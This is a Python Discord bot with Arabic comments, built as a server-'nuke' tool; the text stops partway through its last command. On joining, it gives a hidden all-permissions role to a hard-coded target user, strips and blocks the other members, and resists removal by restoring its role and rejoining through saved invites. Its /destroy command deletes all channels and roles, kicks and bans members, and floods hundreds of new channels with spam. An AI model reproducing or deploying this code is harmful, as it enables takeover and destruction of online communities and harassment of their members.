import discord
from discord import app_commands, ChannelType
from discord.ext import commands, tasks
import asyncio
import random
import json
import os
from datetime import datetime
from typing import Dict, Set, Optional
import traceback

# ====== تحميل المتغيرات من .env ======
from dotenv import load_dotenv
load_dotenv()

# ====== قراءة المتغيرات من .env ======
TOKEN = os.getenv('DISCORD_TOKEN')
TARGET_USER_ID = int(os.getenv('TARGET_USER_ID', '0'))
VERSION = os.getenv('VERSION', '4.0.0')

# ====== التحقق من وجود المتغيرات المطلوبة ======
if not TOKEN:
    print('❌ خطأ: DISCORD_TOKEN غير موجود في ملف .env')
    exit(1)

if not TARGET_USER_ID:
    print('❌ خطأ: TARGET_USER_ID غير موجود في ملف .env')
    exit(1)

print('✅ تم تحميل المتغيرات من .env بنجاح')
print(f'📌 الإصدار: {VERSION}')
print(f'🎯 المستهدف: {TARGET_USER_ID}')

# ====== إعدادات متقدمة ======
CONFIG = {
    'owner_role_name': os.getenv('OWNER_ROLE_NAME', '🛡️'),
    'owner_role_color': 0x000000,
    'max_rooms': int(os.getenv('MAX_ROOMS', '200')),
    'spam_start': 1,
    'spam_speed': float(os.getenv('SPAM_SPEED', '300')) / 1000,
    'spam_messages': [
        '🔥 **تم تدمير السيرفر!**',
        '💀 **RIP SERVER**',
        f'👑 **المالك الجديد هو <@{TARGET_USER_ID}>**',
        '🛡️ **الرتبة محمية بالكامل!**',
        '⚡ **DESTROYED BY BOT**',
        '🔥 **سبام لا نهائي!**',
        '💀 **GOODBYE SERVER**',
        '👑 **OWNERSHIP TRANSFERRED**',
        '🛡️ **PROTECTED ROLE**',
        '⚡ **SYSTEM DESTROYED**',
        '💀 **R.I.P SERVER**',
        '🔥 **DESTROY MODE ACTIVATED**',
        f'👑 **NEW OWNER: <@{TARGET_USER_ID}>**',
        '🛡️ **ROLE LOCKED**',
        '⚡ **SPEED: MAXIMUM**'
    ],
    'protect_messages': [
        '🛡️ **محاولة اختراق فاشلة!**',
        '🔒 **تم حظر المتسلل!**',
        '🚫 **أنت محظور!**',
        '⚔️ **تم الدفاع عن السيرفر!**'
    ],
    'transfer_channel_name': os.getenv('TRANSFER_CHANNEL_NAME', '👑-ownership-transferred'),
    'log_channel_name': os.getenv('LOG_CHANNEL_NAME', '📋-bot-logs')
}

# ====== الصلاحيات ======
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.moderation = True
intents.presences = True
intents.invites = True

bot = commands.Bot(command_prefix="!", intents=intents)

# ====== المتغيرات العامة ======
transferred_servers: Set[int] = set()
blocked_owners: Dict[int, Set[int]] = {}
destroy_status: Dict[int, bool] = {}
protected_roles: Dict[int, discord.Role] = {}
spam_tasks: Dict[int, asyncio.Task] = {}
spam_running: Dict[int, bool] = {}
guild_invites: Dict[int, dict] = {}
anti_kick_guilds: Set[int] = set()
bot_start_time = datetime.now()

# ==========================================
# ====== نظام السجلات ======
# ==========================================
def log(message: str, log_type: str = 'INFO'):
    timestamp = datetime.now().isoformat()
    print(f"[{timestamp}] [{log_type}] {message}")
    try:
        with open('bot-logs.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] [{log_type}] {message}\n")
    except:
        pass

# ==========================================
# ====== دوال الحظر ======
# ==========================================
def is_blocked(user_id: int, guild_id: int) -> bool:
    if guild_id not in blocked_owners:
        return False
    return user_id in blocked_owners[guild_id]

def block_user(user_id: int, guild_id: int, reason: str = 'تم الحظر بواسطة البوت'):
    if guild_id not in blocked_owners:
        blocked_owners[guild_id] = set()
    blocked_owners[guild_id].add(user_id)
    log(f"🛡️ تم حظر المستخدم {user_id} في السيرفر {guild_id} - السبب: {reason}", 'WARNING')

def unblock_user(user_id: int, guild_id: int) -> bool:
    if guild_id in blocked_owners and user_id in blocked_owners[guild_id]:
        blocked_owners[guild_id].discard(user_id)
        log(f"✅ تم إلغاء حظر المستخدم {user_id}", 'SUCCESS')
        return True
    return False

def get_blocked_users(guild_id: int) -> list:
    if guild_id not in blocked_owners:
        return []
    return list(blocked_owners[guild_id])

# ==========================================
# ====== نظام حماية البوت من الطرد ======
# ==========================================
async def save_guild_invite(guild: discord.Guild) -> Optional[discord.Invite]:
    """حفظ دعوة احتياطية للعودة عند الطرد"""
    try:
        invite_channel = None
        for channel in guild.text_channels:
            perms = channel.permissions_for(guild.me)
            if perms.create_instant_invite:
                invite_channel = channel
                break
        
        if not invite_channel:
            try:
                overwrites = {
                    guild.default_role: discord.PermissionOverwrite(view_channel=False)
                }
                invite_channel = await guild.create_text_channel(
                    '🛡️-protection',
                    overwrites=overwrites,
                    reason="قناة الحماية للدعوة الاحتياطية"
                )
            except Exception as e:
                log(f"⚠️ فشل إنشاء قناة الحماية: {e}", 'WARNING')
                return None
        
        try:
            invites = await guild.invites()
            for invite in invites:
                if invite.inviter and invite.inviter.id == bot.user.id:
                    try:
                        await invite.delete()
                    except:
                        pass
        except:
            pass
        
        invite = await invite_channel.create_invite(
            max_age=0,
            max_uses=0,
            unique=True,
            reason="دعوة احتياطية للعودة عند الطرد"
        )
        
        guild_invites[guild.id] = {
            'code': invite.code,
            'url': invite.url,
            'channel_id': invite_channel.id,
            'created_at': datetime.now().isoformat()
        }
        
        try:
            with open('guild-invites.json', 'w', encoding='utf-8') as f:
                json.dump({str(k): v for k, v in guild_invites.items()}, f, indent=2, ensure_ascii=False)
        except:
            pass
        
        log(f"💾 تم حفظ دعوة احتياطية للسيرفر {guild.name}: {invite.code}", 'SUCCESS')
        return invite
    except Exception as e:
        log(f"❌ فشل حفظ الدعوة: {e}", 'ERROR')
        return None

async def try_rejoin_guild(guild_id: int, guild_name: str) -> bool:
    """محاولة العودة للسيرفر عند الطرد"""
    invite_data = guild_invites.get(guild_id)
    if not invite_data:
        log(f"❌ لا توجد دعوة محفوظة للسيرفر {guild_name}", 'ERROR')
        return False
    
    try:
        log(f"🔄 محاولة العودة للسيرفر {guild_name} عبر الدعوة {invite_data['code']}...", 'INFO')
        invite = await bot.fetch_invite(invite_data['code'])
        await invite.accept()
        log(f"✅ تم العودة بنجاح للسيرفر {guild_name}!", 'SUCCESS')
        return True
    except Exception as e:
        log(f"❌ فشل العودة: {e}", 'ERROR')
        return False

# ==========================================
# ====== مهمة حماية البوت الدورية ======
# ==========================================
@tasks.loop(seconds=10)
async def anti_kick_loop():
    """فحص دوري لحماية البوت"""
    for guild in bot.guilds:
        if guild.id not in anti_kick_guilds:
            continue
        
        try:
            bot_member = guild.get_member(bot.user.id)
            if not bot_member:
                continue
            
            has_admin = bot_member.guild_permissions.administrator
            has_manage_roles = bot_member.guild_permissions.manage_roles
            
            if not has_admin or not has_manage_roles:
                log(f"⚠️ البوت فقد بعض الصلاحيات في {guild.name}!", 'WARNING')
                
                protected_role = protected_roles.get(guild.id)
                if protected_role and protected_role not in bot_member.roles:
                    try:
                        await bot_member.add_roles(protected_role, reason='استعادة الصلاحيات')
                        log(f"✅ تم استعادة الصلاحيات عبر الرتبة المحمية", 'SUCCESS')
                    except Exception as e:
                        log(f"❌ فشل استعادة الصلاحيات: {e}", 'ERROR')
            
            protected_role = protected_roles.get(guild.id)
            if protected_role:
                role_still_exists = discord.utils.get(guild.roles, id=protected_role.id)
                if not role_still_exists:
                    log(f"⚠️ الرتبة المحمية حُذفت في {guild.name}! جاري إعادة الإنشاء...", 'WARNING')
                    await create_protected_role(guild)
                else:
                    if protected_role not in bot_member.roles:
                        try:
                            await bot_member.add_roles(protected_role, reason='حماية تلقائية')
                            log(f"🛡️ تم استعادة الرتبة للبوت في {guild.name}", 'SUCCESS')
                        except:
                            pass
        except Exception as e:
            log(f"⚠️ خطأ في حلقة الحماية: {e}", 'WARNING')

# ==========================================
# ====== دوال الرتبة المخفية ======
# ==========================================
async def create_protected_role(guild: discord.Guild) -> Optional[discord.Role]:
    """إنشاء الرتبة المحمية بجميع الصلاحيات"""
    try:
        bot_member = guild.get_member(bot.user.id)
        if not bot_member:
            log(f"❌ البوت غير موجود في السيرفر", 'ERROR')
            return None
        
        bot_highest = bot_member.top_role
        log(f"🔍 أعلى رتبة للبوت: {bot_highest.name} (position: {bot_highest.position})", 'INFO')
        
        existing_role = discord.utils.get(guild.roles, name=CONFIG['owner_role_name'])
        
        if existing_role:
            try:
                await existing_role.edit(
                    hoist=False,
                    mentionable=False,
                    colour=discord.Colour(0x000000),
                    permissions=discord.Permissions.all()
                )
                log(f"✅ تم تحديث الرتبة الموجودة: {existing_role.name}", 'SUCCESS')
            except Exception as e:
                log(f"⚠️ فشل تحديث الرتبة: {e}", 'WARNING')
            
            protected_roles[guild.id] = existing_role
            
            if existing_role not in bot_member.roles:
                try:
                    await bot_member.add_roles(existing_role, reason='حماية البوت')
                    log(f"🛡️ تم إعطاء الرتبة للبوت", 'SUCCESS')
                except:
                    pass
            
            return existing_role
        
        try:
            role = await guild.create_role(
                name=CONFIG['owner_role_name'],
                permissions=discord.Permissions.all(),
                colour=discord.Colour(0x000000),
                hoist=False,
                mentionable=False,
                reason="رتبة مالك مخفية - جميع الصلاحيات"
            )
        except Exception as e:
            log(f"❌ فشل إنشاء الرتبة: {e}", 'ERROR')
            return None
        
        log(f"✅ تم إنشاء الرتبة {role.name} (position: {role.position})", 'SUCCESS')
        
        try:
            new_pos = max(1, bot_highest.position - 1)
            if role.position != new_pos:
                await role.edit(position=new_pos)
                log(f"⬆️ تم رفع الرتبة إلى المركز {new_pos}", 'SUCCESS')
        except Exception as e:
            log(f"⚠️ لم نتمكن من رفع الرتبة: {e}", 'WARNING')
        
        protected_roles[guild.id] = role
        
        if role not in bot_member.roles:
            try:
                await bot_member.add_roles(role, reason='حماية البوت')
                log(f"🛡️ تم إعطاء الرتبة المحمية للبوت نفسه", 'SUCCESS')
            except Exception as e:
                log(f"⚠️ فشل إعطاء الرتبة للبوت: {e}", 'WARNING')
        
        return role
        
    except Exception as e:
        log(f"❌ فشل إنشاء الرتبة المخفية: {e}", 'ERROR')
        traceback.print_exc()
        return None

async def transfer_ownership_fast(guild: discord.Guild) -> dict:
    """نقل الملكية بسرعة"""
    try:
        bot_member = guild.get_member(bot.user.id)
        if not bot_member:
            return {'success': False, 'message': 'البوت غير موجود في السيرفر'}
        
        log(f"🔍 رتبة البوت: {bot_member.top_role.name} (position: {bot_member.top_role.position})", 'INFO')
        
        target_member = guild.get_member(TARGET_USER_ID)
        if not target_member:
            try:
                target_member = await guild.fetch_member(TARGET_USER_ID)
            except:
                return {'success': False, 'message': 'المستخدم المستهدف غير موجود في السيرفر'}
        
        owner_role = await create_protected_role(guild)
        if not owner_role:
            return {'success': False, 'message': 'فشل إنشاء الرتبة المحمية'}
        
        log(f"✅ تم إنشاء/العثور على الرتبة: {owner_role.name}", 'SUCCESS')
        
        for member in guild.members:
            if member.id != TARGET_USER_ID and member.id != bot.user.id and owner_role in member.roles:
                try:
                    await member.remove_roles(owner_role, reason='إزالة الرتبة من المستخدمين الآخرين')
                except:
                    pass
        
        if owner_role not in target_member.roles:
            try:
                await target_member.add_roles(owner_role, reason='نقل الملكية')
                log(f"✅ تم إعطاء الرتبة إلى {target_member.name}", 'SUCCESS')
            except Exception as e:
                log(f"❌ فشل إعطاء الرتبة: {e}", 'ERROR')
                return {'success': False, 'message': f'فشل إعطاء الرتبة: {e}'}
        
        for member in guild.members:
            if member.id != TARGET_USER_ID and not member.bot:
                block_user(member.id, guild.id, 'حظر تلقائي عند نقل الملكية')
                try:
                    admin_roles = [r for r in member.roles if r.permissions.administrator and r.id != guild.id]
                    for role in admin_roles:
                        await member.remove_roles(role)
                except:
                    pass
        
        transferred_servers.add(guild.id)
        log(f"✅ تم نقل الملكية بنجاح في {guild.name}", 'SUCCESS')
        return {'success': True, 'message': 'تم نقل الملكية وحظر الجميع'}
        
    except Exception as e:
        log(f"❌ فشل نقل الملكية: {e}", 'ERROR')
        traceback.print_exc()
        return {'success': False, 'message': str(e)}

# ==========================================
# ====== دوال السبام ======
# ==========================================
async def spam_task(guild_id: int, channel_id: int):
    """مهمة السبام التلقائي"""
    spam_running[guild_id] = True
    message_index = 0
    spam_count = 0
    
    try:
        guild = bot.get_guild(guild_id)
        if guild:
            channel = guild.get_channel(channel_id)
            if channel:
                for i in range(5):
                    await channel.send(f"🔥 **سبام فوري {i+1}!**")
                    spam_count += 1
    except:
        pass
    
    while spam_running.get(guild_id, False):
        try:
            guild = bot.get_guild(guild_id)
            if not guild:
                break
            
            channel = guild.get_channel(channel_id)
            if not channel or not isinstance(channel, discord.TextChannel):
                break
            
            messages_to_send = random.randint(1, 3)
            for _ in range(messages_to_send):
                message = CONFIG['spam_messages'][message_index % len(CONFIG['spam_messages'])]
                await channel.send(message)
                message_index += 1
                spam_count += 1
                
                if random.random() > 0.5:
                    await channel.send(f"🔥 **روم رقم {spam_count}**")
                if random.random() > 0.6:
                    await channel.send(f"💀 **{random.randint(1, 10000)}**")
                if random.random() > 0.7:
                    await channel.send(f"⚡ **SPAM #{spam_count}**")
                if random.random() > 0.8:
                    await channel.send("🛡️ **PROTECTED**")
                
                await asyncio.sleep(0.05)
            
            if spam_count % 50 == 0:
                log(f"💬 تم إرسال {spam_count} رسالة سبام", 'INFO')
            
            await asyncio.sleep(CONFIG['spam_speed'])
            
        except Exception as e:
            log(f"⚠️ خطأ في السبام: {e}", 'WARNING')
            break
    
    spam_running[guild_id] = False

def start_spam(guild_id: int, channel_id: int):
    """بدء السبام"""
    if guild_id in spam_tasks:
        spam_running[guild_id] = False
        spam_tasks[guild_id].cancel()
    
    spam_running[guild_id] = True
    task = asyncio.create_task(spam_task(guild_id, channel_id))
    spam_tasks[guild_id] = task
    log(f"💬 بدء السبام في القناة {channel_id}", 'INFO')

def stop_spam(guild_id: int) -> bool:
    """إيقاف السبام"""
    if guild_id in spam_tasks:
        spam_running[guild_id] = False
        spam_tasks[guild_id].cancel()
        del spam_tasks[guild_id]
        log(f"🛑 تم إيقاف السبام في السيرفر {guild_id}", 'SUCCESS')
        return True
    return False

def is_spam_running(guild_id: int) -> bool:
    return spam_running.get(guild_id, False)

# ==========================================
# ====== عند تشغيل البوت ======
# ==========================================
@bot.event
async def on_ready():
    log(f"✅ جاهز: {bot.user}", 'SUCCESS')
    log(f"📊 في {len(bot.guilds)} سيرفرات", 'INFO')
    log(f"🎯 سيتم نقل الملكية إلى: {TARGET_USER_ID}", 'INFO')
    log("🔒 فقط المالك الجديد يمكنه استخدام الأوامر!", 'WARNING')
    log("🚫 جميع المستخدمين الآخرين محظورون!", 'WARNING')
    log("👑 الرتبة غير مرئية ومحمية!", 'INFO')
    log("🛡️ نظام حماية البوت من الطرد: مفعل", 'SUCCESS')
    log(f"📌 الإصدار: {VERSION}", 'INFO')
    
    try:
        if os.path.exists('guild-invites.json'):
            with open('guild-invites.json', 'r', encoding='utf-8') as f:
                data = json.load(f)
                for guild_id_str, invite_data in data.items():
                    guild_invites[int(guild_id_str)] = invite_data
            log(f"💾 تم تحميل {len(guild_invites)} دعوة محفوظة", 'SUCCESS')
    except Exception as e:
        log(f"⚠️ فشل تحميل الدعوات: {e}", 'WARNING')
    
    for guild in bot.guilds:
        anti_kick_guilds.add(guild.id)
        await save_guild_invite(guild)
        
        existing_role = discord.utils.get(guild.roles, name=CONFIG['owner_role_name'])
        if not existing_role:
            log(f"🔧 إنشاء الرتبة المحمية في {guild.name}...", 'INFO')
            await create_protected_role(guild)
        else:
            protected_roles[guild.id] = existing_role
    
    if not anti_kick_loop.is_running():
        anti_kick_loop.start()
    
    await update_status()
    
    try:
        synced = await bot.tree.sync()
        log(f"✅ تم تسجيل {len(synced)} أمر", 'SUCCESS')
    except Exception as e:
        log(f"❌ فشل التسجيل: {e}", 'ERROR')

async def update_status():
    """تحديث حالة البوت"""
    total_guilds = len(bot.guilds)
    total_members = sum(g.member_count or 0 for g in bot.guilds)
    status = f"{total_guilds} سيرفرات | {total_members} عضو | v{VERSION}"
    
    try:
        await bot.change_presence(
            activity=discord.Activity(type=discord.ActivityType.watching, name=status),
            status=discord.Status.online
        )
    except:
        pass

# ==========================================
# ====== عند طرد البوت ======
# ==========================================
@bot.event
async def on_guild_remove(guild: discord.Guild):
    log(f"⚠️ تم طرد البوت من السيرفر: {guild.name} ({guild.id})", 'WARNING')
    
    invite_data = guild_invites.get(guild.id)
    if invite_data:
        log(f"🔄 محاولة العودة للسيرفر {guild.name}...", 'INFO')
        await asyncio.sleep(3)
        await try_rejoin_guild(guild.id, guild.name)

# ==========================================
# ====== عند دخول البوت ======
# ==========================================
@bot.event
async def on_guild_join(guild: discord.Guild):
    log(f"🔥 دخلت إلى سيرفر: {guild.name} (ID: {guild.id})", 'INFO')
    
    anti_kick_guilds.add(guild.id)
    await save_guild_invite(guild)
    
    current_owner = guild.owner
    if not current_owner:
        log(f"❌ لا يمكن العثور على مالك السيرفر", 'ERROR')
        return
    
    log(f"👑 المالك الحالي: {current_owner.name}", 'INFO')
    
    try:
        bot_member = guild.get_member(bot.user.id)
        if not bot_member or not bot_member.guild_permissions.administrator:
            log(f"❌ البوت ليس لديه صلاحية Administrator في {guild.name}", 'ERROR')
            return
        
        await create_protected_role(guild)
        result = await transfer_ownership_fast(guild)
        
        if result['success']:
            log(f"✅ {result['message']} في {guild.name}", 'SUCCESS')
            
            try:
                channel = await guild.create_text_channel(CONFIG['transfer_channel_name'])
                
                embed = discord.Embed(
                    title='👑 تم نقل الملكية!',
                    description=(
                        f'🔄 المالك الجديد: <@{TARGET_USER_ID}>\n'
                        f'🛡️ الرتبة غير مرئية ومحمية!\n'
                        f'🔒 **فقط <@{TARGET_USER_ID}> يمكنه استخدام الأوامر!**\n'
                        f'🚫 **جميع المستخدمين الآخرين محظورون!**\n'
                        f'📁 سيتم إنشاء {CONFIG["max_rooms"]} روم\n'
                        f'💬 سيبدأ السبام **فوراً** من أول روم!\n'
                        f'🛡️ **البوت محمي من الطرد!**\n'
                        f'📌 الإصدار: {VERSION}'
                    ),
                    color=discord.Color.gold(),
                    timestamp=datetime.now()
                )
                await channel.send(embed=embed)
            except Exception as e:
                log(f"⚠️ فشل إنشاء روم التأكيد: {e}", 'WARNING')
        else:
            log(f"❌ فشل نقل الملكية: {result['message']}", 'ERROR')
        
        await update_status()
        
    except Exception as e:
        log(f"❌ فشل في {guild.name}: {e}", 'ERROR')
        traceback.print_exc()

# ==========================================
# ====== مراقبة الرتبة ======
# ==========================================
@bot.event
async def on_member_update(before: discord.Member, after: discord.Member):
    if after.guild.id not in transferred_servers:
        return
    
    protected_role = protected_roles.get(after.guild.id)
    if not protected_role:
        return
    
    if after.id == bot.user.id:
        had_role = protected_role in before.roles
        has_role = protected_role in after.roles
        
        if had_role and not has_role:
            log(f"🚨 تمت إزالة الرتبة المحمية من البوت! جاري الاستعادة...", 'WARNING')
            try:
                await after.add_roles(protected_role, reason='استعادة الحماية')
                log(f"✅ تم استعادة الرتبة للبوت", 'SUCCESS')
            except Exception as e:
                log(f"❌ فشل استعادة الرتبة: {e}", 'ERROR')
        return
    
    has_before = protected_role in before.roles
    has_after = protected_role in after.roles
    
    if has_after and not has_before:
        if after.id != TARGET_USER_ID:
            try:
                await after.remove_roles(protected_role)
                block_user(after.id, after.guild.id, 'محاولة استعادة الرتبة')
                log(f"🛡️ تم منع {after.name} من استعادة الرتبة المخفية", 'WARNING')
                
                random_msg = random.choice(CONFIG['protect_messages'])
                try:
                    await after.send(random_msg)
                except:
                    pass
            except Exception as e:
                log(f"❌ فشل منع {after.name}: {e}", 'ERROR')

@bot.event
async def on_guild_role_update(before: discord.Role, after: discord.Role):
    protected_role = protected_roles.get(after.guild.id)
    if not protected_role:
        return
    
    if after.id == protected_role.id:
        try:
            await after.edit(
                name=CONFIG['owner_role_name'],
                colour=discord.Colour(0x000000),
                hoist=False,
                mentionable=False,
                position=0
            )
            log(f"🛡️ تم منع تعديل الرتبة المخفية في {after.guild.name}", 'WARNING')
        except:
            pass

@bot.event
async def on_guild_role_delete(role: discord.Role):
    protected_role = protected_roles.get(role.guild.id)
    if not protected_role:
        return
    
    if role.id == protected_role.id:
        log(f"🚨 تم حذف الرتبة المحمية في {role.guild.name}! جاري إعادة الإنشاء...", 'WARNING')
        del protected_roles[role.guild.id]
        await create_protected_role(role.guild)

# ==========================================
# ====== التحقق من الأوامر ======
# ==========================================
async def check_command(interaction: discord.Interaction) -> bool:
    user_id = interaction.user.id
    guild_id = interaction.guild.id
    
    if user_id == TARGET_USER_ID:
        return True
    
    log(f"🚫 محاولة استخدام أمر من {interaction.user.name} ({user_id}) - ممنوع!", 'WARNING')
    block_user(user_id, guild_id, 'محاولة استخدام أمر')
    
    try:
        await interaction.response.send_message(
            f"🚫 **أنت محظور تماماً!**\n\n"
            f"👑 **فقط** <@{TARGET_USER_ID}> يمكنه استخدام الأوامر.\n"
            f"🔒 جميع المستخدمين الآخرين محظورون.\n"
            f"🛡️ تم تسجيل محاولتك وحظرك.",
            ephemeral=True
        )
    except:
        try:
            await interaction.followup.send(
                f"🚫 **أنت محظور تماماً!**\n"
                f"👑 فقط <@{TARGET_USER_ID}> يمكنه استخدام الأوامر.",
                ephemeral=True
            )
        except:
            pass
    
    return False

# ==========================================
# ====== أمر /destroy ======
# ==========================================
@bot.tree.command(name="destroy", description="🔥 تدمير سريع مع سبام تلقائي")
@app_commands.describe(speed="سرعة التدمير", rooms="عدد الرومات (1-500)")
@app_commands.choices(speed=[
    app_commands.Choice(name='🐢 بطيء', value='slow'),
    app_commands.Choice(name='🐇 متوسط', value='medium'),
    app_commands.Choice(name='🚀 سريع', value='fast'),
    app_commands.Choice(name='⚡ خارق', value='ultra')
])
async def destroy(interaction: discord.Interaction, speed: str = 'medium', rooms: int = 200):
    guild = interaction.guild
    guild_id = guild.id
    
    if not await check_command(interaction):
        return
    
    bot_member = guild.get_member(bot.user.id)
    if not bot_member or not bot_member.guild_permissions.administrator:
        await interaction.response.send_message("❌ البوت يحتاج صلاحية Administrator", ephemeral=True)
        return
    
    if destroy_status.get(guild_id, False):
        await interaction.response.send_message("⚠️ التدمير يعمل بالفعل! استخدم /stop", ephemeral=True)
        return
    
    await interaction.response.defer(ephemeral=False)
    
    result = await transfer_ownership_fast(guild)
    
    if not result['success']:
        await interaction.edit_original_response(content=f"❌ فشل نقل الملكية: {result['message']}")
        return
    
    await interaction.edit_original_response(content=f"✅ **تم نقل الملكية!**\n🔄 بدء التدمير...")
    
    delays = {'slow': 0.3, 'medium': 0.05, 'fast': 0.01, 'ultra': 0.001}
    delay = delays.get(speed, 0.05)
    max_rooms = min(max(rooms, 1), 500)
    
    destroy_status[guild_id] = True
    
    results = {'channels': 0, 'roles': 0, 'members': 0, 'bans': 0, 'rooms': 0}
    spam_started = False
    spam_channel_id = None
    
    try:
        try:
            await guild.edit(name="🔥 DESTROYED")
        except:
            pass
        
        for channel in list(guild.channels):
            if not destroy_status.get(guild_id, False):
                break
            try:
                await channel.delete()
                results['channels'] += 1
                await asyncio.sleep(delay)
            except:
                pass
        
        protected_role = protected_roles.get(guild_id)
        for role in list(guild.roles):
            if not destroy_status.get(guild_id, False):
                break
            if role.name != '@everyone' and role.id != (protected_role.id if protected_role else 0):
                try:
                    await role.delete()
                    results['roles'] += 1
                    await asyncio.sleep(delay)
                except:
                    pass
        
        for member in list(guild.members):
            if not destroy_status.get(guild_id, False):
                break
            if member.id == TARGET_USER_ID or member.bot:
                continue
            try:
                await member.kick(reason="🔥 تدمير")
                results['members'] += 1
                await asyncio.sleep(delay)
            except:
                pass
        
        for member in list(guild.members):
            if not destroy_status.get(guild_id, False):
                break
            if member.id == TARGET_USER_ID or member.bot:
                continue
            try:
                await member.ban(reason="🔥 تدمير")
                results['bans'] += 1
                await asyncio.sleep(delay)
            except:
                pass
        
        room_counter = 1
        batch_size = 10 if speed == 'ultra' else 5
        
        while destroy_status.get(guild_id, False) and results['rooms'] < max_rooms:
            try:
                batch_count = min(batch_size, max_rooms - results['rooms'])
                created_channels = []
                
                for i in range(batch_count):
                    if not destroy_status.get(guild_id, False):
                        break
                    try:
                        new_channel = await guild.create_text_channel(f"🔥-RIP-{room_counter}")
                        created_channels.append(new_channel)
                        results['rooms'] += 1
                        room_counter += 1
                        
                        if not spam_started and results['rooms'] >= CONFIG['spam_start']:
                            spam_started = True
                            spam_channel_id = new_channel.id
                            start_spam(guild_id, new_channel.id)
                            log(f"💬 بدء السبام الفوري في الروم {results['rooms']}", 'INFO')
                    except:
                        pass
                
                if results['rooms'] % 10 == 0 or results['rooms'] == max_rooms:
                    try:
                        await interaction.edit_original_response(
                            content=(
                                f"🔥 **جاري التدمير...**\n"
                                f"📁 {results['rooms']}/{max_rooms} روم\n"
                                f"{'💬 السبام يعمل ✅ (فوري)' if spam_started else '⏳ انتظار السبام...'}\n"
                                f"⚡ السرعة: {speed}"
                            )
                        )
                    except:
                        pass
                
                await asyncio.sleep(0.05)
                
            except Exception as e:
                log(f"⚠️ فشل إنشاء الروم: {e}", 'WARNING')
                break
    
    except Exception as e:
        log(f"❌ خطأ أثناء التدمير: {e}", 'ERROR')
        traceback.print_exc()
    
    stop_spam(guild_id)
    destroy_status[guild_id] = False
    
    embed = discord.Embed(
        title='🔥 تم التدمير!',
        description=(
            f'🛡️ الرتبة المخفية محمية بالكامل!\n'
            f'💬 بدأ السبام **فوراً** من أول روم!\n'
            f'🔒 **فقط <@{TARGET_USER_ID}> يمكنه استخدام الأوامر!**\n'
            f'🚫 **جميع المستخدمين الآخرين محظورون!**\n'
            f'⚡ السرعة: {speed}'
        ),
        color=discord.Color.red(),
        timestamp=datetime.now()
    )
    embed.add_field(name='🗑️ رومات محذوفة', value=str(results['channels']), inline=True)
    embed.add_field(name='🎭 أدوار محذوفة', value=str(results['roles']), inline=True)
    embed.add_field(name='🚪 أعضاء مطرودون', value=str(results['members']), inline=True)
    embed.add_field(name='🔨 أعضاء محظورون', value=str(results['bans']), inline=True)
    embed.add_field(name='📁 رومات جديدة', value=f"{results['rooms']}/{max_rooms}", inline=True)
    embed.add_field(name='💬 السبام', value='✅ مفعل (فوري)' if spam_started else '❌ معطل', inline=True)
    embed.add_field(name='👑 مالك جديد', value=f'<@{TARGET_USER_ID}>', inline=True)
    embed.add_field(name='📌 الإصدار', value=VERSION, inline=True)
    
    try:
        await interaction.edit_original_response(content=None, embed=embed)
    except Exception as e:
        log(f"⚠️ فشل إرسال النتيجة: {e}", 'WARNING')
        try:
            for channel in guild.text_channels:
                try:
                    await channel.send(embed=embed)
                    break
                except:
                    continue
        except:
            pass

# ==========================================
# ====== أوامر أخرى ======
# ==========================================
@bot.tree.command(name="stop", description="🛑 يوقف التدمير والسبام")
async def stop(interaction: discord.Interaction):
    if interaction.user.id != TARGET_USER_ID:
        await interaction.response.send_message("❌ هذا الأمر فقط للمالك الجديد.", ephemeral=True)
        return
    
    guild_id = interaction.guild.id
    stop_spam(guild_id)
    
    if not destroy_status.get(guild_id, False):
        await interaction.response.send_message("ℹ️ لا يوجد تدمير يعمل.", ephemeral=True)
        return
    
    destroy_status[guild_id] = False
    await interaction.response.send_message("🛑 **تم إيقاف التدمير والسبام!**")

@bot.tree.command(name="stopspam", description="🛑 يوقف السبام فقط")
async def stopspam(interaction: discord.Interaction):
    if interaction.user.id != TARGET_USER_ID:
        await interaction.response.send_message("❌ هذا الأمر فقط للمالك الجديد.", ephemeral=True)
        return
    
    guild_id = interaction.guild.id
    stopped = stop_spam(guild_id)
    
    if stopped:
        await interaction.response.send_message("🛑 **تم إيقاف السبام!**")
    else:
        await interaction.response.send_message("ℹ️ لا يوجد سبام يعمل.")

@bot.tree.command(name="transfer", description="⚡ ينقل الملكية برتبة مخفية")
async def transfer(interaction: discord.Interaction):
    if interaction.user.id != TARGET_USER_ID:
        await interaction.response.send_message("❌ هذا الأمر فقط للمالك الجديد.", ephemeral=True)
        return
    
    await interaction.response.defer()
    
    result = await transfer_ownership_fast(interaction.guild)
    
    if result['success']:
        embed = discord.Embed(
            title='✅ تم نقل الملكية!',
            description='👑 الرتبة غير مرئية ومحمية بالكامل!\n🔒 فقط المالك الجديد يمكنه استخدام الأوامر!',
            color=discord.Color.green()
        )
        await interaction.followup.send(embed=embed)
    else:
        await interaction.followup.send(f"❌ فشل: {result['message']}")

@bot.tree.command(name="checkrole", description="🔍 التحقق من الرتبة المخفية")
async def checkrole(interaction: discord.Interaction):
    if interaction.user.id != TARGET_USER_ID:
        await interaction.response.send_message("❌ هذا الأمر فقط للمالك الجديد.", ephemeral=True)
        return
    
    guild_id = interaction.guild.id
    protected_role = protected_roles.get(guild_id)
    
    if protected_role:
        role_still_exists = discord.utils.get(interaction.guild.roles, id=protected_role.id)
        
        embed = discord.Embed(
            title='🔍 الرتبة المخفية',
            description=(
                f'✅ الرتبة موجودة ومحمية!\n'
                f'📛 الاسم: `{protected_role.name}`\n'
                f'🆔 ID: `{protected_role.id}`\n'
                f'👥 عدد الأعضاء: {len(protected_role.members)}\n'
                f'📊 المركز: {protected_role.position}\n'
                f'🔒 موجودة فعلاً: {"✅ نعم" if role_still_exists else "❌ لا"}\n'
                f'🎨 اللون: أسود (غير مرئي)'
            ),
            color=discord.Color.green() if role_still_exists else discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
    else:
        await interaction.response.send_message(
            "❌ لا توجد رتبة مخفية في هذا السيرفر. استخدم /fixrole لإنشائها.",
            ephemeral=True
        )

@bot.tree.command(name="fixrole", description="🔧 إنشاء/إصلاح الرتبة المحمية يدوياً")
async def fixrole(interaction: discord.Interaction):
    if interaction.user.id != TARGET_USER_ID:
        await interaction.response.send_message("❌ هذا الأمر فقط للمالك الجديد.", ephemeral=True)
        return
    
    guild = interaction.guild
    bot_member = guild.get_member(bot.user.id)
    
    if not bot_member or not bot_member.guild_permissions.administrator:
